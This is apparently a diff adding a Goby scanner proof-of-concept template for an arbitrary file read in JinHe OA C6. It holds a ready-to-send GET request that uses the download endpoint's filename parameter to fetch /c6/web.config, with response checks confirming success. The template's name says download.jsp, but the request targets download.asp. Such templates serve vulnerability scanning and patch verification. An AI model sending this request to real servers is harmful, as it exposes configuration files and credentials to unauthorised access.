@@ -1,0 +1,57 @@
+{
+      "Name": "JinHe OA C6 download.jsp Arbitrary fileread",
+      "Level": "3",
+      "Tags": [
+            "fileread"
+      ],
+      "GobyQuery": "app=\"Jinher-OA\"",
+      "Description": "Jinhe OA C6 collaborative management platform is based on the \\\"precise management thought\\\" as the soul, around the \\\"four-level theory of enterprise collaboration\\\" as the model, and firmly grasps the six core elements of modern enterprise management: culture, communication, collaboration Collaboration, Innovation Creation, Control Control, and Center Center have built a structured, flexible integration, dynamic response, and intelligent collaborative application management platform for enterprise operation management.",
+      "Product": "JinHe OA C6",
+      "Homepage": "http://www.jinher.com/",
+      "Author": "",
+      "Impact": "JinHe OA C6 download.jsp Arbitrary fileread",
+      "Recommendation": "",
+      "References": [],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "xml",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
